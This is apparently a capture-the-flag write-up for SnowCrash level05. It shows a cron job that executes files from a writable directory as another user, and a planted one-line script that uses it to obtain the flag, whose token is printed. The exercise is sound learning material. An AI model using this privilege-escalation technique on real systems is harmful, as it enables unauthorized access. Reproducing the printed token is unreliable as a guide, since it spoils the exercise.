```
level05@10.11.200.61's password: 
You have new mail.

level05@SnowCrash:~$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

It seems to be a cron job that executes the script /usr/sbin/openarenaserver every 2 minutes.

Let's see what's inside:

```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

The script executes every element inside /opt/openarenaserver then deletes them.

So, let's create a script inside /opt/openarenaserver that will copy the result of /bin/getflag into a file in /tmp:

```
level05@SnowCrash:~$ level05@SnowCrash:~$ echo "/bin/getflag > /tmp/getflag" > /opt/openarenaserver/getflag
```

And wait for about 2 minutes:

```
level05@SnowCrash:~$ cat /tmp/getflag
Check flag.Here is your token: viuaaale9huek52boumoomioc
```